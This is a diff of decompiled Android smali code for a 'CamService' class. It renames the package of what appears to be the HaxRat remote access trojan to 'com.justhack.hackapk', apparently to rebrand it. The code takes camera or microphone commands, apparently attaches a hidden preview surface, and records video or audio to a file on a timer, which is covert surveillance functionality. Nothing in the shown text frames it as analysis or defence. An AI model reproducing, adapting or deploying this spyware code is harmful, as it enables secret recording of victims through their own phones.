@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/CamService;
+.class public Lcom/justhack/hackapk/CamService;
 .super Landroid/app/Service;
 .source "CamService.java"
 
@@ -54,15 +54,15 @@
 
     sget v2, Landroid/os/Build$VERSION;->SDK_INT:I
 
-    sput v2, Lcom/hax4us/haxrat/CamService;->currentapiVersion:I
+    sput v2, Lcom/justhack/hackapk/CamService;->currentapiVersion:I
 
     const/4 v2, 0x0
 
-    sput v2, Lcom/hax4us/haxrat/CamService;->typeForVideo:I
+    sput v2, Lcom/justhack/hackapk/CamService;->typeForVideo:I
 
     const/4 v2, 0x1
 
-    sput v2, Lcom/hax4us/haxrat/CamService;->typeForAudio:I
+    sput v2, Lcom/justhack/hackapk/CamService;->typeForAudio:I
 
     return-void
 .end method
@@ -84,7 +84,7 @@
 
     check-cast v3, Landroid/hardware/Camera;
 
-    iput-object v3, v2, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;
+    iput-object v3, v2, Lcom/justhack/hackapk/CamService;->camera:Landroid/hardware/Camera;
 
     move-object v2, v0
 
@@ -92,37 +92,37 @@
 
     check-cast v3, Landroid/media/MediaRecorder;
 
-    iput-object v3, v2, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iput-object v3, v2, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     move-object v2, v0
 
     const/4 v3, -0x1
 
-    iput v3, v2, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iput v3, v2, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     move-object v2, v0
 
     const/4 v3, 0x0
 
-    iput-boolean v3, v2, Lcom/hax4us/haxrat/CamService;->isCameraQualityHigh:Z
+    iput-boolean v3, v2, Lcom/justhack/hackapk/CamService;->isCameraQualityHigh:Z
 
     move-object v2, v0
 
     const/4 v3, 0x0
 
-    iput v3, v2, Lcom/hax4us/haxrat/CamService;->secs:I
+    iput v3, v2, Lcom/justhack/hackapk/CamService;->secs:I
 
     return-void
 .end method
 
-.method static synthetic access$1000012(Lcom/hax4us/haxrat/CamService;)V
+.method static synthetic access$1000012(Lcom/justhack/hackapk/CamService;)V
     .locals 4
 
     move-object v0, p0
 
     move-object v3, v0
 
-    invoke-direct {v3}, Lcom/hax4us/haxrat/CamService;->stopRecording()V
+    invoke-direct {v3}, Lcom/justhack/hackapk/CamService;->stopRecording()V
 
     return-void
 .end method
@@ -899,28 +899,28 @@
 
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iget-object v2, v2, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     invoke-virtual {v2}, Landroid/media/MediaRecorder;->stop()V
 
     .line 170
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iget-object v2, v2, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     invoke-virtual {v2}, Landroid/media/MediaRecorder;->reset()V
 
     .line 171
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iget-object v2, v2, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     invoke-virtual {v2}, Landroid/media/MediaRecorder;->release()V
 
     .line 172
     move-object v2, v0
 
-    iget v2, v2, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v2, v2, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     const/4 v3, 0x1
 
@@ -928,7 +928,7 @@
 
     move-object v2, v0
 
-    iget v2, v2, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v2, v2, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     const/4 v3, 0x2
 
@@ -938,14 +938,14 @@
     :cond_0
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;
+    iget-object v2, v2, Lcom/justhack/hackapk/CamService;->camera:Landroid/hardware/Camera;
 
     invoke-virtual {v2}, Landroid/hardware/Camera;->lock()V
 
     .line 174
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;
+    iget-object v2, v2, Lcom/justhack/hackapk/CamService;->camera:Landroid/hardware/Camera;
 
     invoke-virtual {v2}, Landroid/hardware/Camera;->release()V
 
@@ -953,11 +953,11 @@
     :cond_1
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->windowManager:Landroid/view/WindowManager;
+    iget-object v2, v2, Lcom/justhack/hackapk/CamService;->windowManager:Landroid/view/WindowManager;
 
     move-object v3, v0
 
-    iget-object v3, v3, Lcom/hax4us/haxrat/CamService;->surfaceView:Landroid/view/SurfaceView;
+    iget-object v3, v3, Lcom/justhack/hackapk/CamService;->surfaceView:Landroid/view/SurfaceView;
 
     invoke-interface {v2, v3}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V
 
@@ -973,7 +973,7 @@
     .line 178
     move-object v2, v0
 
-    invoke-virtual {v2}, Lcom/hax4us/haxrat/CamService;->stopSelf()V
+    invoke-virtual {v2}, Lcom/justhack/hackapk/CamService;->stopSelf()V
 
     return-void
 .end method
@@ -1072,12 +1072,12 @@
 
     move-result v8
 
-    iput v8, v7, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iput v8, v7, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     .line 64
     move-object v7, v0
 
-    iget v7, v7, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v7, v7, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     const/4 v8, 0x1
 
@@ -1088,7 +1088,7 @@
 
     const-string v8, "RC"
 
-    iput-object v8, v7, Lcom/hax4us/haxrat/CamService;->cmd:Ljava/lang/String;
+    iput-object v8, v7, Lcom/justhack/hackapk/CamService;->cmd:Ljava/lang/String;
 
     .line 69
     :goto_0
@@ -1104,7 +1104,7 @@
 
     move-result v8
 
-    iput v8, v7, Lcom/hax4us/haxrat/CamService;->secs:I
+    iput v8, v7, Lcom/justhack/hackapk/CamService;->secs:I
 
     .line 70
     const-string v7, "Suprem"
@@ -1146,13 +1146,13 @@
 
     const-string v9, "window"
 
-    invoke-virtual {v8, v9}, Lcom/hax4us/haxrat/CamService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    invoke-virtual {v8, v9}, Lcom/justhack/hackapk/CamService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object v8
 
     check-cast v8, Landroid/view/WindowManager;
 
-    iput-object v8, v7, Lcom/hax4us/haxrat/CamService;->windowManager:Landroid/view/WindowManager;
+    iput-object v8, v7, Lcom/justhack/hackapk/CamService;->windowManager:Landroid/view/WindowManager;
 
     .line 80
     move-object v7, v0
@@ -1169,7 +1169,7 @@
 
     invoke-direct {v9, v10}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V
 
-    iput-object v8, v7, Lcom/hax4us/haxrat/CamService;->surfaceView:Landroid/view/SurfaceView;
+    iput-object v8, v7, Lcom/justhack/hackapk/CamService;->surfaceView:Landroid/view/SurfaceView;
 
     .line 81
     new-instance v7, Landroid/view/WindowManager$LayoutParams;
@@ -1197,11 +1197,11 @@
     .line 88
     move-object v7, v0
 
-    iget-object v7, v7, Lcom/hax4us/haxrat/CamService;->windowManager:Landroid/view/WindowManager;
+    iget-object v7, v7, Lcom/justhack/hackapk/CamService;->windowManager:Landroid/view/WindowManager;
 
     move-object v8, v0
 
-    iget-object v8, v8, Lcom/hax4us/haxrat/CamService;->surfaceView:Landroid/view/SurfaceView;
+    iget-object v8, v8, Lcom/justhack/hackapk/CamService;->surfaceView:Landroid/view/SurfaceView;
 
     move-object v9, v5
 
@@ -1210,7 +1210,7 @@
     .line 89
     move-object v7, v0
 
-    iget-object v7, v7, Lcom/hax4us/haxrat/CamService;->surfaceView:Landroid/view/SurfaceView;
+    iget-object v7, v7, Lcom/justhack/hackapk/CamService;->surfaceView:Landroid/view/SurfaceView;
 
     invoke-virtual {v7}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;
 
@@ -1233,7 +1233,7 @@
 
     const-string v8, "FC"
 
-    iput-object v8, v7, Lcom/hax4us/haxrat/CamService;->cmd:Ljava/lang/String;
+    iput-object v8, v7, Lcom/justhack/hackapk/CamService;->cmd:Ljava/lang/String;
 
     goto :goto_0
 .end method
@@ -1289,12 +1289,12 @@
 
     invoke-direct {v8}, Landroid/media/MediaRecorder;-><init>()V
 
-    iput-object v7, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iput-object v7, v6, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     .line 99
     move-object v6, v0
 
-    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v6, v6, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     const/4 v7, 0x1
 
@@ -1302,7 +1302,7 @@
 
     move-object v6, v0
 
-    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v6, v6, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     const/4 v7, 0x2
 
@@ -1335,7 +1335,7 @@
     .line 119
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;
+    iget-object v6, v6, Lcom/justhack/hackapk/CamService;->camera:Landroid/hardware/Camera;
 
     invoke-virtual {v6}, Landroid/hardware/Camera;->unlock()V
 
@@ -1343,7 +1343,7 @@
     :cond_1
     move-object v6, v0
 
-    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v6, v6, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     const/4 v7, 0x1
 
@@ -1351,7 +1351,7 @@
 
     move-object v6, v0
 
-    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v6, v6, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     const/4 v7, 0x2
 
@@ -1361,7 +1361,7 @@
     :cond_2
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iget-object v6, v6, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     move-object v7, v1
 
@@ -1374,18 +1374,18 @@
     .line 123
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iget-object v6, v6, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     move-object v7, v0
 
-    iget-object v7, v7, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;
+    iget-object v7, v7, Lcom/justhack/hackapk/CamService;->camera:Landroid/hardware/Camera;
 
     invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setCamera(Landroid/hardware/Camera;)V
 
     .line 124
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iget-object v6, v6, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     const/4 v7, 0x1
 
@@ -1394,7 +1394,7 @@
     .line 125
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iget-object v6, v6, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     const/4 v7, 0x1
 
@@ -1421,7 +1421,7 @@
 
     move-object v8, v0
 
-    iget-boolean v8, v8, Lcom/hax4us/haxrat/CamService;->isCameraQualityHigh:Z
+    iget-boolean v8, v8, Lcom/justhack/hackapk/CamService;->isCameraQualityHigh:Z
 
     invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Z)Ljava/lang/StringBuffer;
 
@@ -1438,14 +1438,14 @@
     .line 127
     move-object v6, v0
 
-    iget-boolean v6, v6, Lcom/hax4us/haxrat/CamService;->isCameraQualityHigh:Z
+    iget-boolean v6, v6, Lcom/justhack/hackapk/CamService;->isCameraQualityHigh:Z
 
     if-nez v6, :cond_9
 
     .line 130
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iget-object v6, v6, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     const/4 v7, 0x0
 
@@ -1459,26 +1459,26 @@
     :goto_1
     move-object v6, v0
 
-    sget v7, Lcom/hax4us/haxrat/CamService;->typeForVideo:I
+    sget v7, Lcom/justhack/hackapk/CamService;->typeForVideo:I
 
     move-object v8, v0
 
-    iget v8, v8, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v8, v8, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     invoke-static {v7, v8}, Lcom/util/extras/Utils;->getFilePath(II)Ljava/io/File;
 
     move-result-object v7
 
-    iput-object v7, v6, Lcom/hax4us/haxrat/CamService;->file:Ljava/io/File;
+    iput-object v7, v6, Lcom/justhack/hackapk/CamService;->file:Ljava/io/File;
 
     .line 136
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iget-object v6, v6, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     move-object v7, v0
 
-    iget-object v7, v7, Lcom/hax4us/haxrat/CamService;->file:Ljava/io/File;
+    iget-object v7, v7, Lcom/justhack/hackapk/CamService;->file:Ljava/io/File;
 
     invoke-virtual {v7}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
 
@@ -1490,7 +1490,7 @@
     :cond_3
     move-object v6, v0
 
-    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v6, v6, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     const/4 v7, 0x1
 
@@ -1498,7 +1498,7 @@
 
     move-object v6, v0
 
-    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v6, v6, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     const/4 v7, 0x2
 
@@ -1506,7 +1506,7 @@
 
     move-object v6, v0
 
-    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v6, v6, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     const/4 v7, 0x3
 
@@ -1517,7 +1517,7 @@
     move-object v6, v0
 
     :try_start_0
-    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iget-object v6, v6, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     invoke-virtual {v6}, Landroid/media/MediaRecorder;->prepare()V
     :try_end_0
@@ -1536,14 +1536,14 @@
     .line 153
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iget-object v6, v6, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     invoke-virtual {v6}, Landroid/media/MediaRecorder;->start()V
 
     .line 154
     move-object v6, v0
 
-    new-instance v7, Lcom/hax4us/haxrat/CamService$100000000;
+    new-instance v7, Lcom/justhack/hackapk/CamService$100000000;
 
     move-object v10, v7
 
@@ -1553,9 +1553,9 @@
 
     move-object v9, v0
 
-    invoke-direct {v8, v9}, Lcom/hax4us/haxrat/CamService$100000000;-><init>(Lcom/hax4us/haxrat/CamService;)V
+    invoke-direct {v8, v9}, Lcom/justhack/hackapk/CamService$100000000;-><init>(Lcom/justhack/hackapk/CamService;)V
 
-    iput-object v7, v6, Lcom/hax4us/haxrat/CamService;->stopRecordingTimer:Ljava/util/TimerTask;
+    iput-object v7, v6, Lcom/justhack/hackapk/CamService;->stopRecordingTimer:Ljava/util/TimerTask;
 
     .line 164
     new-instance v6, Ljava/util/Timer;
@@ -1570,11 +1570,11 @@
 
     move-object v7, v0
 
-    iget-object v7, v7, Lcom/hax4us/haxrat/CamService;->stopRecordingTimer:Ljava/util/TimerTask;
+    iget-object v7, v7, Lcom/justhack/hackapk/CamService;->stopRecordingTimer:Ljava/util/TimerTask;
 
     move-object v8, v0
 
-    iget v8, v8, Lcom/hax4us/haxrat/CamService;->secs:I
+    iget v8, v8, Lcom/justhack/hackapk/CamService;->secs:I
 
     const/16 v9, 0x3e8
 
@@ -1642,7 +1642,7 @@
     .line 106
     move-object v6, v0
 
-    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v6, v6, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     const/4 v7, 0x1
 
@@ -1677,7 +1677,7 @@
 
     move-object v8, v0
 
-    iget v8, v8, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v8, v8, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;
 
@@ -1700,10 +1700,10 @@
 
     move-result-object v7
 
-    iput-object v7, v6, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;
+    iput-object v7, v6, Lcom/justhack/hackapk/CamService;->camera:Landroid/hardware/Camera;
 
     .line 109
-    sget v6, Lcom/hax4us/haxrat/CamService;->currentapiVersion:I
+    sget v6, Lcom/justhack/hackapk/CamService;->currentapiVersion:I
 
     const/16 v7, 0x11
 
@@ -1718,7 +1718,7 @@
     .line 110
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;
+    iget-object v6, v6, Lcom/justhack/hackapk/CamService;->camera:Landroid/hardware/Camera;
 
     const/4 v7, 0x0
 
@@ -1737,7 +1737,7 @@
     :cond_8
     move-object v6, v0
 
-    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v6, v6, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     const/4 v7, 0x2
 
@@ -1772,7 +1772,7 @@
 
     move-object v8, v0
 
-    iget v8, v8, Lcom/hax4us/haxrat/CamService;->buttonNumber:I
+    iget v8, v8, Lcom/justhack/hackapk/CamService;->buttonNumber:I
 
     invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;
 
@@ -1795,10 +1795,10 @@
 
     move-result-object v7
 
-    iput-object v7, v6, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;
+    iput-object v7, v6, Lcom/justhack/hackapk/CamService;->camera:Landroid/hardware/Camera;
 
     .line 115
-    sget v6, Lcom/hax4us/haxrat/CamService;->currentapiVersion:I
+    sget v6, Lcom/justhack/hackapk/CamService;->currentapiVersion:I
 
     const/16 v7, 0x11
 
@@ -1813,7 +1813,7 @@
     .line 116
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;
+    iget-object v6, v6, Lcom/justhack/hackapk/CamService;->camera:Landroid/hardware/Camera;
 
     const/4 v7, 0x0
 
@@ -1827,7 +1827,7 @@
     :cond_9
     move-object v6, v0
 
-    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
+    iget-object v6, v6, Lcom/justhack/hackapk/CamService;->mediaRecorder:Landroid/media/MediaRecorder;
 
     const/4 v7, 0x1
 
